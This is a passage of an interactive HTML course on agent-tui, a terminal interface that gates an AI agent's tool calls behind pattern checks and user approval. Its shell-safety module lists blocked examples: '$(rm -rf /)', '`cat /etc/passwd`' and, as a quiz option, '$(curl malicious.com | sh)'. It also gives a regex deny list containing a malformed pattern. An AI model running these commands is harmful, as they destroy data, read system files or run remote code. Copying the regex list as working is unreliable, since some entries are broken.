message</p>\n          <p class=\"tl\">If it's safe, show the approval widget and wait for the user</p>\n          <p class=\"tl\">Forward the user's decision (approved/denied) back to the agent</p>\n        </div>\n      </div>\n    </div>\n\n    <div class=\"screen animate-in\">\n      <div class=\"callout callout-warning\">\n        <div class=\"callout-icon\">⚠️</div>\n        <div class=\"callout-content\">\n          <strong class=\"callout-title\">The approval is a speed bump, not a wall</strong>\n          <p>Once you approve a tool, the agent can use it multiple times. Use auto-approve (Ctrl+T) wisely — it's meant for trusted code review workflows where you've already inspected what the agent is doing.</p>\n        </div>\n      </div>\n    </div>\n\n    <div class=\"screen animate-in\">\n      <h2 class=\"screen-heading\">Quiz: Approval logic</h2>\n      <div class=\"quiz-container\" id=\"quiz-4\">\n        <div class=\"quiz-question-block\" data-question=\"q1\" data-correct=\"option-a\">\n          <h3 class=\"quiz-question\">The agent wants to run: execute echo $HOME. What happens?</h3>\n          <div class=\"quiz-options\">\n            <button class=\"quiz-option\" data-value=\"option-a\" onclick=\"selectOption(this)\">\n              <div class=\"quiz-option-radio\"></div>\n              <span>Blocked immediately — $VAR is a dangerous pattern</span>\n            </button>\n            <button class=\"quiz-option\" data-value=\"option-b\" onclick=\"selectOption(this)\">\n              <div class=\"quiz-option-radio\"></div>\n              <span>Shows approval widget — you decide</span>\n            </button>\n            <button class=\"quiz-option\" data-value=\"option-c\" onclick=\"selectOption(this)\">\n              <div class=\"quiz-option-radio\"></div>\n              <span>Runs automatically because echo is safe</span>\n            </button>\n          </div>\n          <div class=\"quiz-feedback\" id=\"q1-feedback\"></div>\n        </div>\n\n        <button class=\"quiz-check-btn\" onclick=\"checkQuiz('quiz-4')\">Check Answers</button>\n        <button class=\"quiz-reset-btn\" onclick=\"resetQuiz('quiz-4')\">Try Again</button>\n      </div>\n    </div>\n  </div>\n</section>\n\n<!-- Module 5: Shell Safety -->\n<section class=\"module\" id=\"module-5\">\n  <div class=\"module-content\">\n    <header class=\"module-header animate-in\">\n      <span class=\"module-number\">05</span>\n      <h1 class=\"module-title\">Shell Safety</h1>\n      <p class=\"module-subtitle\">The dangerous patterns that get blocked before you even see them</p>\n    </header>\n\n    <div class=\"screen animate-in\">\n      <h2 class=\"screen-heading\">Why shell commands are scary</h2>\n      <p style=\"margin-bottom: var(--space-6);\">Shell commands can do almost anything — delete files, exfiltrate data, install malware. Even a \"safe\" command like <code>cat</code> can be weaponized. Here's what agent-tui blocks:</p>\n      <div class=\"code-block\">\n<span class=\"code-comment\"># Command substitution — lets commands hide inside commands</span>\n$(rm -rf /)\n`cat /etc/passwd`\n\n<span class=\"code-comment\"># Variable expansion — can inject arbitrary commands</span>\n$HOME\n${PATH}\n$((1+1))\n\n<span class=\"code-comment\"># Process substitution — runs commands in a subshell</span>\n<(some command)\n>(some command)\n\n<span class=\"code-comment\"># Redirections — can overwrite or append to files</span>\n>>\n>\n<\n<<\n\n<span class=\"code-comment\"># Newlines and special characters — can break out of commands</span>\n\\n\n\\r\n\\t</div>\n    </div>\n\n    <div class=\"screen animate-in\">\n      <h2 class=\"screen-heading\">The pattern checker</h2>\n      <p style=\"margin-bottom: var(--space-4);\">The <span class=\"term\" data-definition=\"A regular expression (regex) is a pattern-matching language. It's like a super-powered find-and-replace that can match complex patterns like 'anything starting with $ followed by letters'.\">regex</span> that detects these dangerous patterns:</p>\n      <div class=\"translation-block\">\n        <div class=\"translation-code\">\n          <span class=\"translation-label\">CODE</span>\n          <pre><code>DANGEROUS_SHELL_PATTERNS = [\n    <span class=\"code-string\">r'\\$'</span>,      <span class=\"code-comment\"># $ at start of variable</span>\n    <span class=\"code-string\">r'\\`'</span>,      <span class=\"code-comment\"># backticks</span>\n    <span class=\"code-string\">r'\\$('</span>,     <span class=\"code-comment\"># $(command)</span>\n    <span class=\"code-string\">r'<>'</span>,     <span class=\"code-comment\"># process substitution</span>\n    <span class=\"code-string\">r'>>'</span>,     <span class=\"code-comment\"># append redirect</span>\n    <span class=\"code-string\">r'\\s>>\\s'</span>,  <span class=\"code-comment\"># space + >></span>\n    <span class=\"code-string\">r'<<<'</span>,    <span class=\"code-comment\"># here string</span>\n]</code></pre>\n        </div>\n        <div class=\"translation-english\">\n          <span class=\"translation-label\">PLAIN ENGLISH</span>\n          <p class=\"tl\">Any $ character — could be variable expansion</p>\n          <p class=\"tl\">Backticks — old-style command substitution</p>\n          <p class=\"tl\">$(...) — command substitution syntax</p>\n          <p class=\"tl\"><> — process substitution syntax</p>\n          <p class=\"tl\">>> or any redirect operator</p>\n        </div>\n      </div>\n    </div>\n\n    <div class=\"screen animate-in\">\n      <h2 class=\"screen-heading\">Safe commands that DO work</h2>\n      <p style=\"margin-bottom: var(--space-4);\">Not all shell commands are blocked. Simple commands without special characters are fine:</p>\n      <div class=\"pattern-cards\">\n        <div class=\"pattern-card\">\n          <div class=\"pattern-icon\" style=\"background: var(--color-success)\">✓</div>\n          <h4 class=\"pattern-title\">echo hello</h4>\n          <p class=\"pattern-desc\">Prints text to the terminal</p>\n        </div>\n        <div class=\"pattern-card\">\n          <div class=\"pattern-icon\" style=\"background: var(--color-success)\">✓</div>\n          <h4 class=\"pattern-title\">ls -la</h4>\n          <p class=\"pattern-desc\">Lists files with details</p>\n        </div>\n        <div class=\"pattern-card\">\n          <div class=\"pattern-icon\" style=\"background: var(--color-success)\">✓</div>\n          <h4 class=\"pattern-title\">git status</h4>\n          <p class=\"pattern-desc\">Shows git repository state</p>\n        </div>\n        <div class=\"pattern-card\">\n          <div class=\"pattern-icon\" style=\"background: var(--color-success)\">✓</div>\n          <h4 class=\"pattern-title\">pwd</h4>\n          <p class=\"pattern-desc\">Prints working directory</p>\n        </div>\n      </div>\n    </div>\n\n    <div class=\"screen animate-in\">\n      <div class=\"callout callout-info\">\n        <div class=\"callout-icon\">🛡️</div>\n        <div class=\"callout-content\">\n          <strong class=\"callout-title\">Defense in depth</strong>\n          <p>The dangerous pattern check happens BEFORE the approval widget. This means even if you're not paying attention, basic malicious patterns are blocked automatically. You only see the widget for commands that pass this first check.</p>\n        </div>\n      </div>\n    </div>\n\n    <div class=\"screen animate-in\">\n      <h2 class=\"screen-heading\">Quiz: Danger detection</h2>\n      <div class=\"quiz-container\" id=\"quiz-5\">\n        <div class=\"quiz-question-block\" data-question=\"q1\" data-correct=\"option-b\">\n          <h3 class=\"quiz-question\">Which of these would be blocked? (Select all that apply)</h3>\n          <div class=\"quiz-options\">\n            <button class=\"quiz-option\" data-value=\"option-a\" onclick=\"selectOption(this)\">\n              <div class=\"quiz-option-radio\"></div>\n              <span>echo hello</span>\n            </button>\n            <button class=\"quiz-option\" data-value=\"option-b\" onclick=\"selectOption(this)\">\n              <div class=\"quiz-option-radio\"></div>\n              <span>$(curl malicious.com | sh)</span>\n            </button>\n            <button class=\"quiz-option\" data-value=\"option-c\" onclick=\"selectOption(this)\">\n              <div class=\"quiz-option-radio\"></div>\n              <span>cat file.txt</span>\n            </button>\n            <button class=\"quiz-option\" data-value=\"option-d\" onclick=\"selectOption(this)\">\n              <div class=\"quiz-option-radio\"></div>\n              <span>echo hello > output.txt</span>\n            </button>\n          </div>\n          <div class=\"quiz-feedback\" id=\"q1-feedback\"></div>\n        </div>\n\n        <button class=\"quiz-check-btn\" onclick=\"checkQuiz('quiz-5')\">Check Answers</button>\n        <button class=\"quiz-reset-btn\" onclick=\"resetQuiz('quiz-5')\">Try Again</button>\n      </div>\n    </div>\n  </div>\n</section>\n\n<!-- Module 6: The Big Picture -->\n<section class=\"module\" id=\"module-6\">\n  <div class=\"module-content\">\n    <header class=\"module-header animate-in\">\n      <span class=\"module-number\">06</span>\n      <h1 class=\"module-title\">The Big Picture</h1>\n      <p class=\"module-subtitle\">Putting it all together</p>\n    </header>\n\n    <div class=\"screen animate-in\">\n      <h2 class=\"screen-heading\">The complete architecture</h2>\n      <p style=\"margin-bottom: var(--space-6);\">Here's how everything fits together:</p>\n      <div class=\"pattern-cards stagger-children\">\n        <div class=\"pattern-card animate-in\" style=\"--stagger-index: 0; border-top: 3px solid var(--color-actor-1)\">\n          <div class=\"pattern-icon\" style=\"background: var(--color-actor-1)\">🖥️</div>\n          <h4 class=\"pattern-title\">Textual UI</h4>\n          <p class=\"pattern-desc\">The user interface — chat input, messages, approval widgets, status bar</p>\n        </div>\n        <div class=\"pattern-card animate-in\" style=\"--stagger-index: 1; border-top: 3px solid var(--color-actor-2)\">\n          <div class=\"pattern-icon\" style=\"background: var(--color-actor-2)\">🔌</div>\n          <h4 class=\"pattern-title\">AgentAdapter</h4>\n          <p class=\"pattern-desc\">Translates agent events to UI actions, handles safety checks</p>\n        </div>\n        <div class=\"pattern-card animate-in\" style=\"--stagger-index: 2; border-top: 3px solid var(--color-actor-3)\">\n          <div class=\"pattern-icon\" style=\"background: var(--color-actor-3)\">📝</div>\n          <h4 class=\"pattern-title\">AgentProtocol</h4>\n          <p class=\"pattern-desc\">The contract any agent backend must implement</p>\n        </div>\n        <div class=\"pattern-card animate-in\" style=\"--stagger-index: 3; border-top: 3px solid var(--color-actor-4)\">\n          <div class=\"pattern-icon\" style=\"background: var(--color-actor-4)\">🎭</div>\n          <h4 class=\"pattern-title\">StubAgent</h4>\n          <p class=\"pattern-desc\">Testing agent — cycles through scenarios automatically</p>\n        </div>\n        <div class=\"pattern-card animate-in\" style=\"--stagger-index: 4; border-top: 3px solid var(--color-actor-5)\">\n          <div class=\"pattern-icon\" style=\"background: var(--color-actor-5)\">🔧</div>\n          <h4 class=\"pattern-title\">DeepAgentsAdapter</h4>\n          <p class=\"pattern-desc\">Real agent — connects to actual AI models via LangGraph</p>\n        </div>\n      </div>\n    </div>\n\n    <div class=\"screen animate-in\">\n      <h2 class=\"screen-heading\">The key design patterns you can use in your own projects</h2>\n      <div class=\"icon-rows\">\n        <div class=\"icon-row animate-in\">\n          <div class=\"icon-circle\" style=\"background: var(--color-accent)\">🔌</div>\n          <div>\n            <strong>Protocol-based design</strong>\n            <p>Define what your code MUST do as a protocol, not how it does it. This lets you swap implementations without changing consumers.</p>\n          </div>\n        </div>\n        <div class=\"icon-row animate-in\">\n          <div class=\"icon-circle\" style=\"background: var(--color-actor-2)\">🎯</div>\n          <div>\n            <strong>Event-driven architecture</strong>\n            <p>Components communicate by emitting events, not calling each other directly. This makes the system easier to extend and test.</p>\n          </div>\n        </div>\n        <div class=\"icon-row animate-in\">\n          <div class=\"icon-circle\" style=\"background: var(--color-actor-3)\">🛡️</div>\n          <div>\n            <strong>Defense in depth</strong>\n            <p>Multiple layers of safety — dangerous pattern check first, then approval widget, then user decision. Each layer catches something the others might miss.</p>\n          </div>\n        </div>\n      </div>\n    </div>\n\n    <div class=\"screen animate-in\">\n      <h2 class=\"screen-heading\">Final quiz: Putting it all together</h2>\n      <div class=\"quiz-container\" id=\"quiz-6\">\n        <div class=\"quiz-question-block\" data-question=\"q1\" data-correct=\"option-c\">\n          <h3 class=\"quiz-question\">You want to add a new feature to agent-tui: a tool that sends emails. Which files would you likely need to modify?</h3>\n          <div class=\"quiz-options\">\n            <button class=\"quiz-option\" data-value=\"option-a\" onclick=\"selectOption(this)\">\n              <div class=\"quiz-option-radio\"></div>\n              <span>Only the TUI — agents handle tools automatically</span>\n            </button>\n            <button class=\"quiz-option\" data-value=\"option-b\" onclick=\"selectOption(this)\">\n              <div class=\"quiz-option-radio\"></div>\n              <span>Only the adapter — it dispatches all tools</span>\n            </button>\n            <button class=\"quiz-option\" data-value=\"option-c\" onclick=\"selectOption(this)\">\n              <div class=\"quiz-option-radio\"></div>\n              <span>The agent backend (to implement the tool) and possibly the adapter (if it needs special handling)</span>\n            </button>\n          </div>\n          <div class=\"quiz-feedback\" id=\"q1-feedback\"></div>\n        </div>\n\n        <button class=\"quiz-check-btn\" onclick=\"checkQuiz('quiz-6')\">Check Answers</button>\n        <button class=\"quiz-reset-btn\" onclick=\"resetQuiz('quiz-6')\">Try Again</button>\n      </div>\n    </div>\n\n    <div class=\"screen animate-in\">\n      <div class=\"callout callout-accent\">\n        <div class=\"callout-icon\">🎓</div>\n        <div class=\"callout-content\">\n          <strong class=\"callout-title\">You made it!</strong>\n          <p>You now understand how agent-tui works. The key takeaway: the protocol pattern lets you build flexible systems where components can be swapped. The approval system adds safety without adding complexity to the agent code. And defense in depth — checking dangerous patterns before showing the widget — makes the system safer without annoying the user.</p>\n        </div>\n      </div>\n    </div>\n  </div>\n</section>\n\n<script>\n// ==================== Tooltip System ====================\nlet activeTooltip = null;\n\nfunction positionTooltip(term, tip) {\n  const rect = term.getBoundingClientRect();\n  const tipWidth = 300;\n  let left = rect.left + rect.width / 2 - tipWidth / 2;\n  left = Math.max(8, Math.min(left, window.innerWidth - tipWidth - 8));\n  let top = rect.top - 8;\n  tip.style.left = left + 'px';\n  document.body.appendChild(tip);\n  const tipHeight = tip.offsetHeight;\n  if (rect.top - tipHeight - 8 < 0) {\n    tip.style.top = (rect.bottom + 8) + 'px';\n    tip.classList.add('flip');\n  } else {\n    tip.style.top = (rect.top - tipHeight - 8) + 'px';\n    tip.classList.remove('flip');\n  }\n}\n\ndocument.querySelectorAll('.term').forEach(term => {\n  const tip = document.createElement('span');\n  tip.className = 'term-tooltip';\n  tip.textContent = term.dataset.definition;\n\n  term.addEventListener('mouseenter', () => {\n    if (activeTooltip && activeTooltip !== tip) {\n      activeTooltip.classList.remove('visible');\n      activeTooltip.remove();\n    }\n    positionTooltip(term, tip);\n    requestAnimationFrame(() => tip.classList.add('visible'));\n    activeTooltip = tip;\n  });\n\n  term.addEventListener('mouseleave', () => {\n    tip.classList.remove('visible');\n    setTimeout(() => { if (!tip.classList.contains('visible')) tip.remove(); }, 150);\n    activeTooltip = null;\n  });\n\n  term.addEventListener('click', (e) => {\n    e.stopPropagation();\n    if (tip.classList.contains('visible')) {\n      tip.classList.remove('visible');\n      tip.remove();\n      activeTooltip = null;\n    } else {\n      positionTooltip(term, tip);\n      requestAnimationFrame(() => tip.classList.add('visible'));\n      activeTooltip = tip;\n    }\n  });\n});\n\ndocument.addEventListener('click', () => {\n  if (activeTooltip) {\n    activeTooltip.classList.remove('visible');\n    activeTooltip.remove();\n    activeTooltip = null;\n  }\n});\n\n// ==================== Progress Bar ====================\nconst progressBar = document.getElementById('progress-bar');\nconst navDots = document.querySelectorAll('.nav-dot');\nconst modules = document.querySelectorAll('.module');\n\nfunction updateProgress() {\n  const scrollTop = window.scrollY;\n  const scrollHeight = document.documentElement.scrollHeight - window.innerHeight;\n  const progress = (scrollTop / scrollHeight) * 100;\n  progressBar.style.width = progress + '%';\n\n  // Update nav dots\n  let currentModule = 0;\n  modules.forEach((module, i) => {\n    const rect = module.getBoundingClientRect();\n    if (rect.top < window.innerHeight / 2) {\n      currentModule = i;\n    }\n  });\n\n  navDots.forEach((dot, i) => {\n    dot.classList.remove('active', 'visited');\n    if (i < currentModule) dot.classList.add('visited');\n    if (i === currentModule) dot.classList.add('active');\n  });\n}\n\nwindow.addEventListener('scroll', () => {\n  requestAnimationFrame(updateProgress);\n}, { passive: true });\n\n// Nav dot click\nnavDots.forEach(dot => {\n  dot.addEventListener('click', () => {\n    const target = document.getElementById(dot.dataset.target);\n    if (target) target.scrollIntoView({ behavior: 'smooth' });\n  });\n});\n\n// ==================== Scroll Animations ====================\nconst observer = new IntersectionObserver((entries) => {\n  entries.forEach(entry => {\n    if (entry.isIntersecting) {\n      entry.target.classList.add('visible');\n    }\n  });\n}, { rootMargin: '0px 0px -10% 0px', threshold: 0.1 });\n\ndocument.querySelectorAll('.animate-in').forEach(el => observer.observe(el));\n\n// ==================== Flow Animation ====================\nconst flowSteps = [\n  { highlight: 'user', label: 'You type: \"execute echo hello\" and press Enter' },\n  { highlight: 'tui', label: 'TUI receives your message and mounts a widget showing your text' },\n  { highlight: 'agent', label: 'TUI forwards to agent. Agent streams back: \"I need to run echo\"' },\n  { highlight: 'agent', label: 'Agent emits TOOL_CALL event for the \"execute\" tool' },\n  { highlight: 'tui', label: 'TUI shows approval widget. You click \"y\" to approve' },\n];\n\nlet flowStep = 0;\n\nfunction flowNext() {\n  if (flowStep >= flowSteps.length) return;\n  const step = flowSteps[flowStep];\n\n  document.querySelectorAll('.flow-actor').forEach(a => a.classList.remove('active'));\n  document.getElementById(`flow-${step.highlight}`).classList.add('active');\n\n  document.getElementById('flow-label').textContent = step.label;\n  document.getElementById('flow-progress').textContent = `Step ${flowStep + 1}/${flowSteps.length}`;\n\n  flowStep++;\n}\n\nfunction flowReset() {\n  flowStep = 0;\n  document.querySelectorAll('.flow-actor').forEach(a => a.classList.remove('active'));\n  document.getElementById('flow-label').textContent = 'Click \"Next Step\" to begin';\n  document.getElementById('flow-progress').textContent = 'Step 0/5';\n}\n\n// ==================== Chat Animation ====================\nconst chatActors = {\n  'user': { initials: '👤', color: 'var(--color-actor-1)' },\n  'tui': { initials: '🖥️', color: 'var(--color-actor-3)' },\n  'agent': { initials: '🤖', color: 'var(--color-actor-2)' },\n  'adapter': { initials: '🔌', color: 'var(--color-actor-4)' }\n};\n\nconst chatMessages = document.querySelectorAll('#chat-messages .chat-message');\nlet chatIndex = 0;\n\nfunction playChatNext() {\n  if (chatIndex >= chatMessages.length) return;\n  const msg = chatMessages[chatIndex];\n  const sender = msg.dataset.sender;\n\n  const typing = document.getElementById('chat-typing');\n  const avatar = document.getElementById('typing-avatar');\n  avatar.textContent = chatActors[sender].initials;\n  avatar.style.background = chatActors[sender].color;\n  typing.style.display = 'flex';\n\n  setTimeout(() => {\n    typing.style.display = 'none';\n    msg.style.display = 'flex';\n    chatIndex++;\n    document.getElementById('chat-progress').textContent = `${chatIndex} / ${chatMessages.length} messages`;\n  }, 800);\n}\n\nfunction playChatAll() {\n  const interval = setInterval(() => {\n    if (chatIndex >= chatMessages.length) { clearInterval(interval); return; }\n    playChatNext();\n  }, 1200);\n}\n\nfunction resetChat() {\n  chatIndex = 0;\n  chatMessages.forEach(m => m.style.display = 'none');\n  document.getElementById('chat-progress').textContent = `0 / ${chatMessages.length} messages`;\n}\n\n// ==================== Quiz System ====================\nwindow.selectOption = function(btn) {\n  const block = btn.closest('.quiz-question-block');\n  block.querySelectorAll('.quiz-option').forEach(o => o.classList.remove('selected'));\n  btn.classList.add('selected');\n};\n\nfunction getExplanation(q, isCorrect) {\n  if (!isCorrect) {\n    return \"Not quite — think about what the safety systems in agent-tui are designed to prevent.\";\n  }\n  return \"Exactly right! This is how the safety systems work in practice.\";\n}\n\nwindow.checkQuiz = function(sectionId) {\n  const container = document.getElementById(sectionId);\n  const questions = container.querySelectorAll('.quiz-question-block');\n  let correct = 0;\n\n  questions.forEach(q => {\n    const selected = q.querySelector('.quiz-option.selected');\n    const feedback = q.querySelector('.quiz-feedback');\n    const correctValue = q.dataset.correct;\n\n    if (!selected) {\n      feedback.innerHTML = 'Pick an answer first!';\n      feedback.className = 'quiz-feedback show warning';\n      return;\n    }\n\n    if (selected.dataset.value === correctValue) {\n      correct++;\n      selected.classList.add('correct');\n      feedback.innerHTML = '<strong>Exactly!</strong> ' + getExplanation(q, true);\n      feedback.className = 'quiz-feedback show success';\n    } else {\n      selected.classList.add('incorrect');\n      q.querySelector(`[data-value=\"${correctValue}\"]`).classList.add('correct');\n      feedback.innerHTML = '<strong>Not quite.</strong> ' + getExplanation(q, false);\n      feedback.className = 'quiz-feedback show error';\n    }\n\n    q.querySelectorAll('.quiz-option').forEach(o => o.disabled = true);\n  });\n};\n\nwindow.resetQuiz = function(sectionId) {\n  const container = document.getElementById(sectionId);\n  const questions = container.querySelectorAll('.quiz-question-block');\n\n  questions.forEach(q => {\n    q.querySelectorAll('.quiz-option').forEach(o => {\n      o.disabled = false;\n      o.classList.remove('selected', 'correct', 'incorrect');\n    });\n    const feedback = q.querySelector('.quiz-feedback');\n    feedback.className = 'quiz-feedback';\n    feedback.innerHTML = '';\n  });\n};\n\n// ==================== Keyboard Navigation ====================\ndocument.addEventListener('keydown', (e) => {\n  if (['INPUT', 'TEXTAREA'].includes(e.target.tagName)) return;\n\n  const currentIndex = Array.from(modules).findIndex(m => {\n    const rect = m.getBoundingClientRect();\n    return rect.top < window.innerHeight / 2 && rect.bottom > window.innerHeight / 2;\n  });\n\n  if (e.key === 'ArrowDown' || e.key === 'ArrowRight') {\n    if (currentIndex < modules.length - 1) {\n      modules[currentIndex + 1].scrollIntoView({ behavior: 'smooth' });\n    }\n    e.preventDefault();\n  }\n  if (e.key === 'ArrowUp' || e.key === 'ArrowLeft') {\n    if (currentIndex > 0) {\n      modules[currentIndex - 1].scrollIntoView({ behavior: 'smooth' });\n    }\n    e.preventDefault();\n  }\n});\n</script>\n\n</body>\n</html>\n",
